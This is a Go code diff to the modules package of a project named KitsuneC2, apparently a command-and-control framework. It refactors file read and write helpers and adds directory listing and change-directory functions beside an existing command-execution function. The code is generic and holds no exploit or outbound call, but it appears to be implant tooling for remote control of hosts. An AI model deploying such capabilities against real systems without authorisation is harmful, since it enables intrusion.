@@ -4,11 +4,13 @@
 package modules
 
 import (
+	"KitsuneC2/lib/utils"
+	"fmt"
 	"io/fs"
 	"os"
 	"os/exec"
-	"path"
-	"path/filepath"
+	"strings"
+	"time"
 )
 
 // Given a filepath, returns info about a file such as name, size etc.
@@ -30,34 +32,32 @@ func Exec(cmd string, args []string) ([]byte, error) {
 	return byteOut, nil
 }
 
-// Writes file to specified location with name=filename.
-func WriteFile(file []byte, location string, filename string) error {
-	path, err := filepath.Abs(path.Join(location, filename))
-	if err != nil {
-		return err
-	}
-	fp, err := os.Create(path)
-	if err != nil {
-		return err
-	}
-	defer fp.Close()
-	_, err = fp.Write(file)
-	if err != nil {
-		return err
-	}
-	return nil
+// Writes file to specified location.
+func WriteFile(file []byte, location string) error {
+	return utils.WriteFile(file, location)
 }
 
-// Reas
+// Reads file from "path" and returns content as bytes
 func ReadFile(path string) ([]byte, error) {
-	path, err := filepath.Abs(path)
+	return utils.ReadFile(path)
+}
+
+// lists directory given on path
+func Ls(path string) (string, error) {
+	files, err := os.ReadDir(path)
 	if err != nil {
-		return nil, err
+		return "", err
+	}
+	var output *strings.Builder = new(strings.Builder)
+	for _, file := range files {
+		fileInf, _ := file.Info()
+		fmt.Fprintf(output, "%s  %d  %s    %s\n", fileInf.Mode().String(), fileInf.Size(), fileInf.ModTime().Format(time.UnixDate), fileInf.Name())
 	}
 
-	content, err := os.ReadFile(path)
-	if err != nil {
-		return nil, err
-	}
-	return content, nil
+	return output.String(), nil
+}
+
+// Changes current working directory to "path".
+func Cd(path string) error {
+	return os.Chdir(path)
 }
